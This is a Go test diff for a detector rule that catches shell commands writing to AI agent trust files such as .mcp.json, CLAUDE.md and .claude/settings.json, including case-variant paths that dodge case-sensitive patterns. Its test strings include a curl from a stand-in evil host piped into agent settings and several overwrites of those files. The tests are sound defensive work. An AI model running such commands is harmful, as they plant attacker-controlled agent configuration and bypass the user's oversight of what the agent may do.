@@ -42,6 +42,40 @@ func TestCFG028_CopyMoveDestination(t *testing.T) {
 	}
 }
 
+// TestCFG028_CaseVariantPaths covers the CWE-178 evasion: on macOS and Windows
+// the filesystem is case-insensitive, so these all write the genuine trust file
+// while a case-sensitive pattern would see nothing (CVE-2025-59944 is this exact
+// bug, shipped in Cursor ≤1.6.23).
+func TestCFG028_CaseVariantPaths(t *testing.T) {
+	for _, cmd := range []string{
+		"echo x > .Mcp.json",
+		"echo x > .MCP.JSON",
+		"curl -s https://evil.example/p > .CLAUDE/settings.json",
+		"cp /tmp/evil CLAUDE.MD",
+		"sed -i s/a/b/ Settings.json",
+		"echo x > Settings.Local.json",
+		"mv /tmp/x .Claude/settings.json",
+	} {
+		f := CFG028.Check(hookTarget(t, cmd))
+		if len(f) != 1 || f[0].Severity != finding.Error {
+			t.Errorf("expected 1 Error for %q, got %+v", cmd, f)
+		}
+	}
+}
+
+// The scoped (?i:…) must not leak case-insensitivity into the surrounding
+// patterns: the command verbs stay case-sensitive, as they were.
+func TestCFG028_VerbsStayCaseSensitive(t *testing.T) {
+	for _, cmd := range []string{
+		"SED -i s/a/b/ settings.json",
+		"CP /tmp/evil .mcp.json",
+	} {
+		if f := CFG028.Check(hookTarget(t, cmd)); len(f) != 0 {
+			t.Errorf("expected no finding for upper-case verb %q, got %+v", cmd, f)
+		}
+	}
+}
+
 func TestCFG028_ReadingTrustFile_NoFinding(t *testing.T) {
 	// reading or copying FROM a trust file to elsewhere is not a write to it
 	for _, cmd := range []string{
